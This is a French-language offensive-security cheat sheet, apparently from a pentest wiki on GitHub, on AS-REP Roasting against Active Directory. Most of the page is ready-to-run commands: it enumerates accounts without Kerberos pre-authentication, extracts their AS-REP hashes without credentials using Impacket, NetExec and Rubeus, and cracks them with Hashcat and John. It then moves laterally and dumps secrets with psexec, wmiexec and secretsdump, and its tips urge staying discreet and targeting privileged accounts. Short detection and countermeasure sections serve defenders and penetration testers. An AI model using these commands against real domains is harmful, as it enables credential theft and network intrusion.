#  AS-REP Roasting

L'AS-REP Roasting est une attaque ciblant les comptes Active Directory dont la **pré-authentification Kerberos est désactivée** (`DONT_REQ_PREAUTH`). Sans cette protection, n'importe qui peut demander un AS-REP pour ces comptes et recevoir une réponse chiffrée avec le hash du mot de passe crackable hors ligne. **Aucun compte du domaine n'est nécessaire** dans certains cas.



##  Mécanisme

Normalement, Kerberos exige que l'utilisateur prouve son identité avant de recevoir un TGT (pré-authentification). Lorsque cette option est désactivée, le KDC répond directement à toute demande AS-REQ avec un **AS-REP chiffré avec le hash NTLM du compte**. Ce hash peut être extrait et cracké hors ligne sans interaction avec la cible.
```
[Attaquant] → AS-REQ (sans pré-auth) → [KDC]
[KDC]       → AS-REP chiffré avec hash du compte → [Attaquant]
[Attaquant] → Crack hors ligne (Hashcat / John)
```

### Différence avec Kerberoasting

| Critère                  | AS-REP Roasting              | Kerberoasting                  |
|--------------------------|------------------------------|--------------------------------|
| Compte requis            | ❌ Non (dans certains cas)   | ✅ Oui (utilisateur du domaine)|
| Cible                    | Comptes sans pré-auth        | Comptes avec SPN               |
| Ticket demandé           | AS-REP (TGT)                 | TGS                            |
| Hash obtenu              | krb5asrep (`18200`)          | krb5tgs (`13100`)              |
| Discrétion               | Plus discret                 | Moins discret                  |

### Conditions d'exploitation

- Le compte cible a l'option `DONT_REQ_PREAUTH` activée
- Accès réseau au contrôleur de domaine sur le port 88
- Aucun compte du domaine requis si les usernames sont connus
- Avec un compte du domaine : énumération LDAP possible pour trouver les cibles



##  Prérequis

| Élément            | Détail                                                  |
|--------------------|---------------------------------------------------------|
| Accès requis       | Aucun (si liste d'users connue) / User du domaine       |
| Credentials        | Aucun requis pour l'attaque de base                     |
| Position réseau    | Accès au DC sur le port 88 (Kerberos)                   |
| Outils nécessaires | Impacket / NetExec / Rubeus / Hashcat / John            |



##  Quick Attack

::: code-group
```bash [Impacket]
# Sans compte — avec liste d'utilisateurs
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC> -outputfile hashes.txt
# Avec compte du domaine — enum auto
impacket-GetNPUsers domain.com/user:password -dc-ip <DC> -request -outputfile hashes.txt
```
```bash [NetExec]
nxc ldap <DC> -u user -p password --asreproast hashes.txt
```
```bash [Rubeus]
# Via Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

:::


##  Workflow 
```
1. Enumérer les comptes sans pré-authentification Kerberos
2. Demander les AS-REP pour ces comptes
3. Extraire les hashes krb5asrep
4. Cracker les hashes hors ligne
5. Utiliser les credentials récupérés
6. Mouvement latéral / escalade de privilèges
```



##  Enumération des comptes vulnérables

### Avec un compte du domaine Impacket
```bash
impacket-GetNPUsers domain.com/user:password -dc-ip <DC> -request
```

### Avec un compte du domaine NetExec
```bash
nxc ldap <DC> -u user -p password --asreproast hashes.txt
```

### Via LDAP
```bash
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

### BloodHound
```bash
# Ingestor
bloodhound-python -u user -p password -d domain.com -dc <DC> -c all
```
```
# Requête Cypher — comptes AS-REP Roastables
MATCH (u:User {dontreqpreauth:true}) RETURN u

# Requête Cypher — AS-REP roastables avec chemin vers DA
MATCH (u:User {dontreqpreauth:true}), (g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}),
p=shortestPath((u)-[*1..]->(g)) RETURN p
```

### PowerView (Windows)
```powershell
# Lister les comptes sans pré-auth
Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName, MemberOf

# Via Active Directory module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```



##  Exploitation

### Méthode 1 Impacket GetNPUsers (sans compte)
```bash
# Avec liste d'utilisateurs
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC>

# Sauvegarder les hashes
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC> -outputfile hashes.txt

# Format Hashcat explicite
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC> -format hashcat
```

### Impacket GetNPUsers (avec compte)
```bash
# Enum auto + dump hashes
impacket-GetNPUsers domain.com/user:password -dc-ip <DC> -request -outputfile hashes.txt

# Avec hash NTLM
impacket-GetNPUsers domain.com/user -hashes :NTLMhash -dc-ip <DC> -request
```

###  NetExec
```bash
nxc ldap <DC> -u user -p password --asreproast hashes.txt

# Null session (si autorisé)
nxc ldap <DC> -u '' -p '' --asreproast hashes.txt
```

###  Rubeus (Windows)
```bash
# Tous les comptes vulnérables
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Cibler un compte spécifique
Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:hash.txt

# Depuis un contexte non authentifié
Rubeus.exe asreproast /domain:domain.com /dc:<DC> /format:hashcat
```

### Invoke-ASREPRoast (PowerShell)
```powershell
Import-Module .\Invoke-ASREPRoast.ps1
Invoke-ASREPRoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt -Encoding ASCII
```



##  Crack des Hashes

### Identifier le format du hash
```
$krb5asrep$23$user@domain.com:...  →  RC4   →  Hashcat mode 18200
$krb5asrep$17$user@domain.com:...  →  AES128 →  Hashcat mode 19800
$krb5asrep$18$user@domain.com:...  →  AES256 →  Hashcat mode 19900
```

### Hashcat RC4 (mode 18200)
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Hashcat avec règles
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

### Hashcat bruteforce
```bash
hashcat -m 18200 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s
```

### John the Ripper
```bash
john hashes.txt --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt
```



##  Post-Exploitation

### Valider les credentials
```bash
nxc smb <DC> -u targetuser -p CrackedPassword
nxc smb <target> -u targetuser -p CrackedPassword
```

### Mouvement latéral
```bash
# PSExec
impacket-psexec domain.com/targetuser:CrackedPassword@<target>

# WMIExec
impacket-wmiexec domain.com/targetuser:CrackedPassword@<target>

# Dump secrets si admin local
impacket-secretsdump domain.com/targetuser:CrackedPassword@<target>
```

### Vérifier les droits du compte compromis
```bash
# Groupes du compte
net user targetuser /domain

# Via NetExec
nxc ldap <DC> -u targetuser -p CrackedPassword --groups
```



##  Détection & IOC

### Event IDs Windows à surveiller

| Event ID | Description                                              |
|----------|----------------------------------------------------------|
| 4768     | TGT demandé — sans pré-auth = suspect                    |
| 4625     | Echec d'authentification post-crack                      |
| 4771     | Echec pré-authentification Kerberos                      |

### Indicateurs de compromission

- Requêtes AS-REQ sans pré-authentification (Event 4768 avec `Pre-Authentication Type: 0`)
- Demandes depuis des IPs inconnues ou inhabituelles
- Plusieurs comptes ciblés depuis la même source en peu de temps
- Authentifications réussies depuis des postes inhabituels après les demandes



##  Contre-mesures

- **Activer la pré-authentification Kerberos** sur tous les comptes (option par défaut — ne pas la désactiver)
- Auditer régulièrement les comptes avec `DONT_REQ_PREAUTH` activé
- Utiliser des mots de passe **longs et complexes (25+ caractères)**
- Monitorer l'Event ID **4768** avec `Pre-Authentication Type: 0`
- Appliquer le **principe du moindre privilège** sur les comptes vulnérables
- Activer **AES256** et désactiver RC4 pour Kerberos
- Mettre en place des alertes SIEM sur les demandes AS-REP anormales



##  Points d'attaque

- Comptes avec `DONT_REQ_PREAUTH` activé (souvent par erreur ou legacy)
- Comptes de service ou techniques sans pré-auth
- Mots de passe faibles sur les comptes vulnérables
- Chiffrement RC4 encore autorisé (facilite le crack)
- Absence de monitoring sur les demandes AS-REP sans pré-auth
- Comptes avec privilèges élevés et pré-auth désactivée



::: tip

- Contrairement au Kerberoasting, **aucun compte du domaine n'est requis** si la liste d'users est connue
- Combiner avec de l'**OSINT** ou de l'**énumération SMB/RPC** pour constituer la liste d'utilisateurs
- Prioriser les comptes membres de groupes privilégiés (DA, EA, Admins)
- Les hashes **RC4** (`18200`) sont beaucoup plus rapides à cracker qu'AES256
- Corréler avec le **Kerberoasting** pour maximiser la collecte de hashes
- Utiliser BloodHound pour identifier les comptes AS-REP roastables avec chemin vers DA
- Rester discret : cibler un compte à la fois, éviter les scans massifs

:::

::: details  Checklist

- Comptes sans pré-authentification Kerberos identifiés
- Comptes privilégiés vulnérables identifiés via BloodHound
- AS-REP demandés et hashes extraits
- Format des hashes identifié (RC4 / AES128 / AES256)
- Crack Hashcat / John lancé
- Credentials récupérés et validés
- Droits du compte compromis vérifiés
- Mouvement latéral effectué
- IOC documentés

:::


##  Tools

- [Impacket GetNPUsers](https://github.com/SecureAuthCorp/impacket)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit)
- [Hashcat](https://hashcat.net/hashcat/)
- [John the Ripper](https://github.com/openwall/john)



## 📚 Ressources

- [HackTricks — AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [The Hacker Recipes — AS-REP Roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
- [PayloadsAllTheThings — AS-REP Roast](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#asreproast)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Impacket GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)



## 🧾 Notes
```
# Notes terrain
```






<div class="page-footer">

<span>📅 ![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![✏️ Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/asreproasting.md)</span>

</div>